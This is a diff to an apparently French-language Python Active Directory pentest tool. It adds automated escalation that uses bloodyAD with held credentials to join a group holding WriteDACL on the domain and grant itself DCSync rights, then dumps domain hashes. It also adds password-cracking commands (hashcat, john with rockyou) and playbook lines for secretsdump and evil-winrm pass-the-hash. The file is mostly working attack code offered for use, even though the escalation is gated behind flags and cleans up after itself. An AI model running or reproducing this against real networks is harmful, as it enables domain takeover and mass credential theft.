@@ -1850,6 +1850,11 @@ def ldap_acl_scan(conn, base, state):
                                     f"{pn} -> {'/'.join(dgr[1])} sur le DOMAINE (=> DCSync possible)",
                                     f"dacledit.py -action write -rights DCSync -principal {pn} "
                                     f"-target-dn '{base}' {state.get('domain')}/{pn}:<pass>")
+                        # memorise le principal (souvent un GROUPE type 'Exchange Windows
+                        # Permissions') pour l'auto-escalade DCSync sous --exploit --yes
+                        dw = state.setdefault("domain_writers", [])
+                        if pn not in dw:
+                            dw.append(pn)
                 for psid, rights in repl.items():
                     if "GetChangesAll" in rights:
                         pname = sid_map.get(psid, psid)
@@ -2364,7 +2369,9 @@ def phase4_escalation(hosts, args, state):
         log(f"{C.Y}[i] nxc absent -> cartographie/RCE sautee (ACL/DCSync/ADCS restent OK).{C.X}")
 
     # 3) endgame : DCSync + coercion/relais + ADCS ESC -> PKINIT (gated --yes)
+    escalate_dcsync_writedacl(args, state, dc)  # groupe WriteDACL domaine -> auto-octroi DCSync
     dcsync_dump(args, state, dc)
+    dcsync_cleanup(args, state)             # retire les droits ajoutes (hygiene)
     attack_trust(args, state, dc)          # child -> parent (ExtraSids) si trust present
     if args.relay:
         coerce_relay(args, state, dc)
@@ -2555,6 +2562,15 @@ def crack_hashes(args, state):
                     add_finding(state, "HIGH", f"Cred CRACKEE ({kind}) : {user}:{pw}",
                                 "reutilisable -> re-enum (boucle)")
                     new += 1
+        # hash non casse automatiquement -> on PROPOSE la commande manuelle (visible ecran)
+        if not creds:
+            state.setdefault("uncracked", []).append({"kind": kind, "path": path, "mode": mode, "fmt": fmt})
+            big = "/usr/share/wordlists/rockyou.txt"
+            log(f"  {C.Y}{C.BD}[A CRAQUER] {kind} non casse auto -> fais-le a la main :{C.X}")
+            log(f"      {C.CY}cat {path}{C.X}")
+            if mode:
+                log(f"      {C.CY}hashcat -m {mode} {path} {big} --force{C.X}")
+            log(f"      {C.CY}john --format={fmt} --wordlist={big} {path}{C.X}")
     if new:
         save_loot(args, "cracked.txt",
                   "\n".join(f"{c['user']}:{c['password']}" for c in state["creds"]
@@ -2643,6 +2659,75 @@ def extract_krbtgt(ntds_file, state):
 # ======================================================================
 # DCSYNC (secretsdump -just-dc) : l'endgame
 # ======================================================================
+def _bloodyad_auth(args, cred):
+    """Args d'auth bloodyAD pour un cred possede (mot de passe OU hash NT)."""
+    a = ["--host", "PLACEHOLDER", "-d", args.domain, "-u", cred["user"]]
+    if cred.get("password"):
+        a += ["-p", cred["password"]]
+    elif cred.get("hash"):
+        h = cred["hash"]
+        a += ["-p", h if ":" in h else ":" + h]   # bloodyAD accepte LM:NT ou :NT
+    return a
+
+def escalate_dcsync_writedacl(args, state, dc):
+    """AUTO-ESCALADE DCSync : un principal (souvent un GROUPE type 'Exchange Windows
+    Permissions') a WriteDACL/WriteOwner/GenericAll sur l'objet DOMAINE. Si on possede
+    un cred capable de rejoindre ce groupe (ex: membre d'Account Operators), on reproduit
+    le combo gagnant : bloodyAD add groupMember <grp> <user> -> add dcsync <user> -> dump.
+    Gated --exploit --yes (jamais sous --safe). Nettoie derriere lui (best-effort)."""
+    if state.get("hashes", {}).get("ntds"):
+        return
+    if not (args.exploit and args.yes) or args.safe:
+        return
+    writers = state.get("domain_writers", [])
+    if not writers:
+        return
+    # cred possede (le principal courant en priorite)
+    creds = []
+    if args.user:
+        creds.append({"user": args.user, "password": args.password, "hash": args.nthash})
+    creds += [c for c in state.get("creds", []) if c.get("user")]
+    cred = next((c for c in creds if c.get("user") and (c.get("password") or c.get("hash"))), None)
+    if not cred:
+        return
+    if not have("bloodyAD"):
+        add_finding(state, "CRIT", "Escalade DCSync auto possible (WriteDACL domaine) - bloodyAD absent",
+                    f"pipx install bloodyAD ; bloodyAD --host {dc} -d {args.domain} "
+                    f"-u {cred['user']} -p <pass> add groupMember '<GROUPE>' {cred['user']} ; "
+                    f"puis add dcsync {cred['user']}", dc)
+        return
+    user = cred["user"]
+    auth = _bloodyad_auth(args, cred); auth[1] = dc   # remplace PLACEHOLDER par le DC
+    for grp in writers:
+        log(f"{C.R}{C.BD}[i] Auto-escalade DCSync via '{grp}' (WriteDACL domaine)...{C.X}")
+        # 1) s'ajouter au groupe (best-effort : peut deja etre membre, ou echouer -> on tente quand meme la suite)
+        run_cmd(["bloodyAD"] + auth + ["add", "groupMember", grp, user], 120)
+        # 2) s'octroyer DCSync grace au WriteDACL herite du groupe
+        rc, out, err = run_cmd(["bloodyAD"] + auth + ["add", "dcsync", user], 120)
+        blob = (out + err).lower()
+        if "dcsync" in blob and ("now able" in blob or "success" in blob or "granted" in blob or rc == 0):
+            add_finding(state, "CRIT",
+                        f"AUTO-ESCALADE : {user} ajoute a '{grp}' + DCSync octroye sur le domaine",
+                        f"secretsdump.py {args.domain}/{user}@{dc} -just-dc", dc)
+            state.setdefault("bloodhound", {}).setdefault("dcsync", []).append(user)
+            state.setdefault("_dcsync_cleanup", []).append((grp, user, cred))
+            return   # droits en place -> dcsync_dump (appele juste apres) fera le dump
+        else:
+            dbg(f"[!] escalade via {grp} : add dcsync KO (rc={rc}) out={out[:200]} err={err[:200]}")
+
+def dcsync_cleanup(args, state):
+    """Retire les droits DCSync et l'appartenance au groupe ajoutes par l'auto-escalade
+    (hygiene d'engagement). Best-effort, silencieux si bloodyAD absent."""
+    todo = state.get("_dcsync_cleanup", [])
+    if not todo or not have("bloodyAD"):
+        return
+    dc = state.get("dc")
+    for grp, user, cred in todo:
+        auth = _bloodyad_auth(args, cred); auth[1] = dc
+        run_cmd(["bloodyAD"] + auth + ["remove", "dcsync", user], 90)
+        run_cmd(["bloodyAD"] + auth + ["remove", "groupMember", grp, user], 90)
+    log(f"{C.GR}[i] Nettoyage : droits DCSync + appartenance groupe retires ({len(todo)}).{C.X}")
+
 def dcsync_dump(args, state, dc):
     if state.get("hashes", {}).get("ntds"):
         return   # deja dumpe (evite de refaire en boucle)
@@ -2995,6 +3080,23 @@ def build_playbook(state, args):
         pb.append("# --- Domaine compromis (NTDS) ---")
         pb.append(f"grep -i 'Administrator:' {state['hashes']['ntds']}")
         pb.append(f"evil-winrm -i {dc} -u Administrator -H <NThash>")
+    # 3b) HASHES non casses auto -> commande de crack manuelle prete a copier
+    for h in state.get("uncracked", []):
+        pb.append(f"# --- Hash {h['kind']} NON casse auto -> a la main ---")
+        pb.append(f"cat {h['path']}")
+        if h.get("mode"):
+            pb.append(f"hashcat -m {h['mode']} {h['path']} /usr/share/wordlists/rockyou.txt --force")
+        pb.append(f"john --format={h['fmt']} --wordlist=/usr/share/wordlists/rockyou.txt {h['path']}")
+    # 3c) groupe/principal avec WriteDACL sur le DOMAINE -> escalade DCSync (bloodyAD)
+    if state.get("domain_writers") and not state.get("hashes", {}).get("ntds"):
+        c0 = next(iter(owned.values()), {"user": "<user_controle>", "password": "<pass>"})
+        for grp in state["domain_writers"]:
+            pb.append(f"# --- Escalade DCSync : '{grp}' a WriteDACL sur le domaine ---")
+            pb.append(f"bloodyAD --host {dc} -d {dom} -u '{c0['user']}' {idf(c0)} "
+                      f"add groupMember '{grp}' '{c0['user']}'")
+            pb.append(f"bloodyAD --host {dc} -d {dom} -u '{c0['user']}' {idf(c0)} "
+                      f"add dcsync '{c0['user']}'")
+            pb.append(f"secretsdump.py {dom}/'{c0['user']}'@{dc} -just-dc-user Administrator")
     # 4) chasse de creds SUR LE DISQUE (ce qu'un scanner ne fait pas : RDP/WinRM)
     pb.append("# --- Creds sur le disque (scripts/configs) : via un compte RDP ou WinRM ---")
     pb.append(f"# WinRM : nxc winrm {dc} -u <user> {idf(next(iter(owned.values()), {'password':'<pass>'}))} "
